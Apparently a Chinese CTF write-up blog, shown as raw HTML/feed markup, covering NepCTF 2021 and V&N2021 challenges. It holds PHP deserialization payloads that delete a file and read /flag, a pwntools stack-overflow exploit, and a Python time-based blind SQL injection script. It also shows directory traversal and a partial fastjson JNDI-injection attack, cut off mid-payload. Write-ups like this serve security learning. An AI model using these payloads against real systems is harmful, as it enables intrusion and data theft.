class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">register</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'waf.txt'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> ZipArchive<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">OVERWRITE</span> <span class="token operator">|</span> ZipArchive<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">CREATE</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>得到payload</p><pre class="language-none"><code class="language-none">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7Tzo1OiJsb2dpbiI6Mzp7czo0OiJmaWxlIjtOO3M6ODoiZmlsZW5hbWUiO047czo3OiJjb250ZW50IjtOO31zOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086MTA6IlppcEFyY2hpdmUiOjU6e3M6Njoic3RhdHVzIjtpOjA7czo5OiJzdGF0dXNTeXMiO2k6MDtzOjg6Im51bUZpbGVzIjtpOjA7czo4OiJmaWxlbmFtZSI7czowOiIiO3M6NzoiY29tbWVudCI7czowOiIiO31zOjg6ImZpbGVuYW1lIjtzOjc6IndhZi50eHQiO3M6NzoiY29udGVudCI7aTo5O30&#x3D;</code></pre><p>成功删除waf.txt</p><img src="/article/Nepctf2021/image-20210322171241326.png" class="" title="delwaf" loading="lazy"><hr><h5 id="读取flag："><a href="#读取flag：" class="headerlink" title="读取flag："></a>读取flag：</h5><p>ls没过滤，有兴趣可以执行ls看一眼，flag在根目录下</p><p>最后一步，分析shell.php，如何在过滤的情况下读取/flag，搜一圈，找到了linux的命令<code>pr</code></p><blockquote><p><strong>pr命令</strong> 用来将文本文件转换成适合打印的格式，它可以把较大的文件分割成多个页面进行打印，并为每个页面添加标题。</p></blockquote><img src="/article/Nepctf2021/image-20210322171800805.png" class="" title="pr" loading="lazy"><p>exp3如下</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token single-quoted-string string">''</span><span class="token single-quoted-string string">'  类同上  '</span><span class="token single-quoted-string string">''</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Game</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">register</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'waf.txt'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'pr /flag'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>得到payload</p><pre class="language-none"><code class="language-none">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6Nzoid2FmLnR4dCI7czo3OiJjb250ZW50IjtzOjg6InByIC9mbGFnIjt9</code></pre><p>拿到flag</p><img src="/article/Nepctf2021/image-20210322173545249.png" class="" title="flag" loading="lazy"><p>记录一下，获取类函数名的方法</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$classes</span> <span class="token operator">=</span> <span class="token function">get_declared_classes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$classes</span> <span class="token keyword">as</span> <span class="token variable">$class</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$methods</span> <span class="token operator">=</span> <span class="token function">get_class_methods</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$methods</span> <span class="token keyword">as</span> <span class="token variable">$method</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token single-quoted-string string">'__destruct'</span><span class="token punctuation">,</span>            <span class="token single-quoted-string string">'__wakeup'</span><span class="token punctuation">,</span>            <span class="token single-quoted-string string">'__call'</span><span class="token punctuation">,</span>            <span class="token single-quoted-string string">'__callStatic'</span><span class="token punctuation">,</span>            <span class="token single-quoted-string string">'open'</span>        <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">print</span> <span class="token variable">$class</span> <span class="token class-name"><span class="token punctuation">.</span></span> <span class="token single-quoted-string string">'::'</span> <span class="token punctuation">.</span> <span class="token variable">$method</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><hr><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="xhh"><a href="#xhh" class="headerlink" title="xhh"></a>xhh</h3><img src="/article/Nepctf2021/20210322132920.png" class="" width="20210322132920" loading="lazy"><p>栈溢出，填充0x10，然后找到system cat flag函数，据地址随机化后字节不变，小端更改地址，当图片刷到小蝌蚪的图案便getshell</p><p>exp:</p><pre class="language-none"><code class="language-none">from pwn import *context.arch &#x3D; &#39;amd64&#39;context.log_level&#x3D;&#39;debug&#39;#p &#x3D; process(&#39;.&#x2F;xhh&#39;)p &#x3D; remote(&#39;node2.hackingfor.fun&#39;,35402 )#p &#x3D; remote(&#39;127.0.0.1&#39;,12345)payload &#x3D; p64(0) + p64(1) + b&quot;\xE1&quot;p.send(payload)p.interactive()</code></pre><hr><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="hardcsharp"><a href="#hardcsharp" class="headerlink" title="hardcsharp"></a>hardcsharp</h3><pre class="language-c#" data-language="c#"><code class="language-c#">private static void Main(string[] args)&#123;    AesClass class2 &#x3D; new AesClass();    string key &#x3D; &quot;&quot;;    string strB &#x3D; &quot;1Umgm5LG6lNPyRCd0LktJhJtyBN7ivpq+EKGmTAcXUM+0ikYZL4h4QTHGqH&#x2F;3Wh0&quot;;    byte[] buffer &#x3D; new byte[] &#123;         0x51, 0x52, 0x57, 0x51, 0x52, 0x57, 0x44, 0x5c, 0x5e, 0x56, 0x5d, 0x12, 0x12, 0x12, 0x12, 0x12,        0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12    &#125;;    Console.WriteLine(&quot;Welcome to nepnep csharp test! plz input the magical code:&quot;);    string str &#x3D; Console.ReadLine();    if (str.Length !&#x3D; 0x25)    &#123;        Console.WriteLine(&quot;Nope!&quot;);        Console.ReadKey();    &#125;    else if ((str.Substring(0, 4) !&#x3D; &quot;Nep&#123;&quot;) || (str[0x24] !&#x3D; &#39;&#125;&#39;))    &#123;        Console.WriteLine(&quot;Nope!&quot;);        Console.ReadKey();    &#125;    else    &#123;        for (int i &#x3D; 0; i &lt; 0x20; i++)        &#123;            key &#x3D; key + Convert.ToChar((int) (buffer[i] ^ 0x33)).ToString();        &#125;        if (string.Compare(class2.AesEncrypt(str, key), strB) &#x3D;&#x3D; 0)        &#123;            Console.WriteLine(&quot;wow, you pass it!&quot;);            Console.ReadKey();        &#125;        else        &#123;            Console.WriteLine(&quot;Nope!&quot;);            Console.ReadKey();        &#125;    &#125;&#125;</code></pre><p>反编译出c#代码</p><p>写exp：</p><pre class="language-none"><code class="language-none">a &#x3D; [0x51, 0x52, 0x57, 0x51, 0x52, 0x57, 0x44, 0x5c, 0x5e, 0x56, 0x5d, 0x12, 0x12, 0x12, 0x12, 0x12,        0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12]for i in range(len(a)):    print(chr(a[i] ^ 0x33),end&#x3D;&quot;&quot;)</code></pre><pre class="language-none"><code class="language-none">λ python3 test.pybadbadwomen!!!!!!!!!!!!!!!!!!!!!</code></pre><p>Aes加密网站一波：</p><img src="/article/Nepctf2021/20210322133852.png" class="" width="20210322133852" loading="lazy"><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>很有收获，尤其是《简单的php反序列化》，又学到一个新姿势。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;队伍名称：Err0r&lt;/p&gt;</summary>
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
    <category term="PHP" scheme="https://err0r.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>V&amp;N2021公开赛</title>
    <link href="https://err0r.top/article/VN2021ctf/"/>
    <id>https://err0r.top/article/VN2021ctf/</id>
    <published>2021-03-15T04:17:51.000Z</published>
    <updated>2021-03-30T11:45:23.761Z</updated>
    
    <content type="html"><![CDATA[<p>比赛昵称：别答了别答了再答人傻了</p><a id="more"></a><p>比赛情况：</p><img src="/article/VN2021ctf/image-20210315121953685.png" class="" title="image-20210315121953685" loading="lazy"><p>孩子太菜了，后面实在不会做了…</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Ez-game"><a href="#Ez-game" class="headerlink" title="Ez_game"></a>Ez_game</h3><p>小游戏题上来就改js</p><img src="/article/VN2021ctf/image-20210315122233099.png" class="" title="image-20210315122233099" loading="lazy"><p>发现游戏关键函数，直接改数据然后<code>Init()</code>,最好疯狂<code>NextLevel()</code>跳到第10关</p><img src="/article/VN2021ctf/image-20210315122433276.png" class="" title="image-20210315122433276" loading="lazy"><p>直接从第十关开始，上去撸boss，出flag</p><img src="/article/VN2021ctf/image-20210315122540586.png" class="" title="image-20210315122540586" loading="lazy"><p>也可以本地保存，直接算js的flag，或者开god模式.<img src="/article/VN2021ctf/image-20210315122714928.png" class="" title="image-20210315122714928" loading="lazy"></p><p>再不行…后面还发现了个函数…<code>boss.Kill()</code></p><hr><h3 id="realezjvav"><a href="#realezjvav" class="headerlink" title="realezjvav"></a>realezjvav</h3><p>hint：我的代码不能注入吧</p><img src="/article/VN2021ctf/image-20210315122917856.png" class="" title="image-20210315122917856" loading="lazy"><p>打开登陆界面，第一反应注入，冷静下看数据量很少，拿出祖传20w字典爆破。</p><p>再冷静下测试一下，确认是sql注入</p><pre class="language-none"><code class="language-none">username&#x3D;\&amp;password&#x3D;or 1&#x3D;1# ·不报错username&#x3D;\&amp;password&#x3D;&#39; ·报错username&#x3D;\&amp;password&#x3D;&#39;&#39; ·不报错username&#x3D;\&amp;password&#x3D;&#39;# ·不报错username&#x3D;\&amp;password&#x3D;&#39;or 1&#x3D;0# ·不报错username&#x3D;\&amp;password&#x3D;&#39;or # ·500报错username&#x3D;\&amp;password&#x3D;&#39;and if(1,sleep(10),select 1)# ·不报错无延时username&#x3D;admin&amp;password&#x3D;&#39;and if(0,sleep(10),select 1)# ·不报错无延时发现没啥用...</code></pre><p>推测后端为：<code>select * from user where username=&#39;$username&#39; and password=&#39;$password&#39;</code></p><p>过滤了sleep()可能</p><p>这里没回显的就延时注入，<code>sleep()</code>,<code>Benchmark()</code>,或者笛卡尔积</p><h4 id="笛卡尔积延时注入"><a href="#笛卡尔积延时注入" class="headerlink" title="笛卡尔积延时注入"></a>笛卡尔积延时注入</h4><p>当然延时不精确，count(*)数量大时，费时就高，何况比赛机子<strong>极其不稳定</strong>，不清楚是我卡了还是机器卡了。</p><blockquote><p>笛卡尔积延时注入</p><p>count(*)后面所有表中的列笛卡尔积数，数量越多越卡，就会有延迟，类似之前某比赛pgsql的延时注入也可以利用此来打时间差，从而达到延时注入的效果</p><p>参考之前的WP：<a href="/article/cqb2021">春秋杯2021新春欢乐赛一道题——按F注入 对pgsql的研究</a></p><pre class="language-none"><code class="language-none">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;+-----------+| count(*)  |+-----------+| 113101560 |+-----------+1 row in set (2.07 sec)mysql&gt; select * from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);+------+-----+| user | pwd |+------+-----+| 1    | 0   |+------+-----+1 row in set (2.08 sec)</code></pre></blockquote><p>甚至数量大了把我数据库给跑崩了…</p><img src="/article/VN2021ctf/image-20210315142653488.png" class="" title="image-20210315142653488" loading="lazy"><p>payload：</p><pre class="language-none"><code class="language-none">-1&#39;and if(&#96;payload&#96;,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#</code></pre><p>脚本：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 3月 14, 2021"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> randomurl <span class="token operator">=</span> <span class="token string">"http://&#123;&#125;.c56083ac-9da0-437e-9b51-5db047b150aa.jvav.vnctf2021.node4.buuoj.cn:82/user/login"</span><span class="token comment"># &#123;&#125;由于开了多个靶机，每次随机访问某个靶机，可以减少冲突可能</span><span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>        <span class="token string">"password"</span><span class="token punctuation">:</span> payload    <span class="token punctuation">&#125;</span>    url1 <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 随机访问</span>    <span class="token comment"># print(url1)</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url1<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token comment"># 不限制超时</span>    <span class="token comment"># print(res.text)</span>    <span class="token keyword">if</span> <span class="token string">"504 Gateway Time-out"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span> <span class="token comment"># 504即为正确</span>        <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token keyword">def</span> <span class="token function">binary_search</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 二分法~</span>    <span class="token comment"># payload = payload.replace("=",">=")</span>    high <span class="token operator">=</span> <span class="token number">127</span>    low <span class="token operator">=</span> <span class="token number">32</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.05</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> mid <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>low<span class="token punctuation">,</span> high <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.05</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> req<span class="token punctuation">(</span>payload <span class="token operator">%</span> mid<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                    <span class="token keyword">return</span> mid            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>high <span class="token operator">+</span> low<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>        pd <span class="token operator">=</span> payload <span class="token operator">%</span> mid        <span class="token keyword">if</span> req<span class="token punctuation">(</span>pd<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            high <span class="token operator">=</span> mid<span class="token keyword">def</span> <span class="token function">version</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"-1'and if((ascii(substr(version(),&#123;&#125;,1))>%d),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">)</span>        <span class="token comment"># 1'and/**/if(ascii(substr(version(),1,1))>64,1,1)like/**/1#</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"version==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"-1'and if((ascii(substr(database(),&#123;&#125;,1))>%d),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">)</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"databases==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token comment"># databases==========>ctf</span><span class="token keyword">def</span> <span class="token function">table</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"-1'and if((ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('ctf')),&#123;&#125;,1))>%d),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            i<span class="token punctuation">)</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"tables==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token comment"># tables==========>ctf</span><span class="token keyword">def</span> <span class="token function">columns</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">" "</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token comment"># 孩子没跑了，太卡了</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"columns==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resultstr <span class="token operator">=</span> <span class="token string">" "</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token comment"># 孩子没跑了，太卡了</span>        j <span class="token operator">=</span> binary_search<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> j <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>            resultstr <span class="token operator">=</span> resultstr <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    resultstr <span class="token operator">=</span> <span class="token string">"data==========>"</span> <span class="token operator">+</span> resultstr    <span class="token keyword">print</span><span class="token punctuation">(</span>resultstr<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment"># version()</span>    <span class="token comment"># database()</span>    table<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># columns()</span>    <span class="token comment"># data()</span></code></pre><p>孩子实在跑不下去了</p><img src="/article/VN2021ctf/image-20210315125931827.png" class="" title="image-20210315125931827" loading="lazy"><p>py出题人换了密码<code>no_0ne_kn0w_th1s</code></p><pre class="language-none"><code class="language-none">username&#x3D;admin&amp;password&#x3D;no_0ne_kn0w_th1s</code></pre><p>登录成功</p><img src="/article/VN2021ctf/image-20210315130110417.png" class="" title="image-20210315130110417" loading="lazy"><p>js加载图片</p><img src="/article/VN2021ctf/image-20210315135332875.png" class="" title="image-20210315135332875" loading="lazy"><p>发现<code>/searchimage</code>可以目录穿越，读不到flag，可能名字不对，读到了<code>pom.xml</code></p><img src="/article/VN2021ctf/image-20210315135240650.png" class="" title="image-20210315135240650" loading="lazy"><p>抓包看</p><img src="/article/VN2021ctf/image-20210315130306763.png" class="" title="image-20210315130306763" loading="lazy"><p>结合应该是fastjson反序列化漏洞</p><h4 id="fastjson-lt-1-2-68反序列化漏洞"><a href="#fastjson-lt-1-2-68反序列化漏洞" class="headerlink" title="fastjson &lt;1.2.68反序列化漏洞"></a>fastjson &lt;1.2.68反序列化漏洞</h4><p>直接payload试一下，被ban了</p><img src="/article/VN2021ctf/image-20210315130941235.png" class="" title="image-20210315130941235" loading="lazy"><p>需要绕过，JSONObject.parseObject()会自动会把json字符串中的Unicode码进行转换，所以转成Unicode即可</p><p>服务器起 <a href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a></p><p><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;payload&quot; -A ip</code></p><img src="/article/VN2021ctf/image-20210315140129288.png" class="" title="image-20210315140129288" loading="lazy"><p>再起监听端口</p><p>最后打payload</p><pre class="language-json" data-language="json"><code class="language-json">roleJson= <span class="token punctuation">&#123;</span><span class="token property">"e"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.Class"</span><span class="token 